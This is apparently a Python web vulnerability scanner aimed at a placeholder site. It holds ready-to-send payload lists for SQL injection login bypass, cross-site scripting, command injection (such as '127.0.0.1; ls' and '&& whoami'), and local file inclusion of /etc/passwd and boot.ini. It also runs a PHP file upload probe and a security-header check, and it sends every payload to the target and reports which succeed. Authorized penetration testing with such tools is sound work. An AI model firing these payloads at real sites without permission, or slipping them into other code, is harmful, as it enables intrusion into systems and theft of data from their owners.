import requests

# Target website URL
url = "http://example.com/"

# SQL Injection payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "admin'/*"
]

# XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "'\"><script>alert('XSS')</script>"
]

# Command Injection payloads
command_injection_payloads = [
    "127.0.0.1; ls",
    "127.0.0.1 && whoami",
    "127.0.0.1 | dir"
]

# LFI payloads
lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../windows/system.ini",
    "../../../../boot.ini"
]

# Vulnerable directory paths
directory_paths = [
    "admin/",
    "uploads/",
    "files/",
    "backup/",
    "config/"
]

# File upload vulnerability test
upload_url = "http://example.com/upload"

# SQL Injection detection function
def sqli_scan(url):
    print(f"Starting SQL Injection scan: {url}")
    
    for payload in sql_payloads:
        params = {'username': payload, 'password': 'password'}
        response = requests.get(url, params=params)
        
        if "Login successful" in response.text or "Welcome" in response.text:
            print(f"[+] SQL Injection vulnerability found! Payload: {payload}")
        else:
            print(f"[-] Safe: {payload}")

# XSS detection function
def xss_scan(url):
    print(f"Starting XSS scan: {url}")
    
    for payload in xss_payloads:
        params = {'search': payload}
        response = requests.get(url, params=params)
        
        if payload in response.text:
            print(f"[+] XSS vulnerability found! Payload: {payload}")
        else:
            print(f"[-] Safe: {payload}")

# Command Injection detection function
def command_injection_scan(url):
    print(f"Starting Command Injection scan: {url}")
    
    for payload in command_injection_payloads:
        params = {'ip': payload}
        response = requests.get(url, params=params)
        
        if "root" in response.text or "admin" in response.text:
            print(f"[+] Command Injection vulnerability found! Payload: {payload}")
        else:
            print(f"[-] Safe: {payload}")

# LFI detection function
def lfi_scan(url):
    print(f"Starting LFI scan: {url}")
    
    for payload in lfi_payloads:
        params = {'file': payload}
        response = requests.get(url, params=params)
        
        if "root:" in response.text or "[boot loader]" in response.text:
            print(f"[+] LFI vulnerability found! Payload: {payload}")
        else:
            print(f"[-] Safe: {payload}")

# File upload vulnerability detection function
def file_upload_scan(upload_url):
    print(f"Starting file upload vulnerability scan: {upload_url}")
    
    # Test file to upload
    files = {'file': ('test.php', '<?php echo "File upload test"; ?>')}
    
    response = requests.post(upload_url, files=files)
    
    if response.status_code == 200 and "File upload successful" in response.text:
        print(f"[+] File upload vulnerability found!")
    else:
        print(f"[-] No file upload vulnerability")

# Check for vulnerable HTTP headers function
def check_http_headers(url):
    print(f"Checking HTTP headers: {url}")
    
    response = requests.get(url)
    
    headers = response.headers
    
    if 'X-Frame-Options' not in headers:
        print("[+] X-Frame-Options header is missing. Vulnerable to clickjacking.")
    if 'Content-Security-Policy' not in headers:
        print("[+] Content-Security-Policy header is missing. Vulnerable to XSS.")
    if 'Strict-Transport-Security' not in headers:
        print("[+] Strict-Transport-Security header is missing. SSL/TLS settings may be insufficient.")

# Main function
def main(url):
    print(f"Starting website vulnerability assessment: {url}")
    sqli_scan(url)
    xss_scan(url)
    command_injection_scan(url)
    lfi_scan(url)
    file_upload_scan(upload_url)
    check_http_headers(url)
    print("Scan completed.")

# Execute the scan
main(url)
